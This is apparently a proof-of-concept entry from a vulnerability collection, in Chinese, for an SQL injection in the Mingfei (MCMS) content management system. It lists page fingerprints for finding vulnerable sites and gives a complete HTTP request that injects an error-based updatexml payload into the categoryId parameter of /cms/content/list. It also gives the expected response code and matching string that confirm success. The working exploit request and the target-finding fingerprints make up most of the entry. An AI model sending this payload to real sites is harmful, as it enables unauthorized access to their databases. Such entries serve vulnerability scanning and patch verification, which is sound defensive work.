﻿# 铭飞CMS list 存在SQL注入

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"

> 验证脚本：HTTP

```
GET /cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271 HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：500

> 响应内容特征：202cb962ac59075

> 上传文件定位：


> 验证文件来源：铭飞CMS list 存在SQL注入.poc
